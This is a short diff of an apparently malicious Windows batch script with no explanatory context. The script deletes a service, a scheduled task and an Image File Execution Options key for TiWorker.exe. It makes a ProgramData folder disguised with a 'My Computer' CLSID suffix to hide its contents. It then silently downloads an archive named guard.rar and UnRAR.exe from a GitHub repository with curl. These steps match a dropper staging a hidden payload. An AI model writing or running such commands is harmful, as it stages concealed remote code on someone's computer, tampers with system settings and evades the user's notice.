@@ -1,5 +1,7 @@
 sc delete Help
+schtasks /Delete /TN "\Windows\Help" /F
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /f
+
 mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\guard.rar" https://github.com/vlad213-tex/1/raw/1/0/guard.rar
 curl.exe -s -L -o "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/0/UnRAR.exe
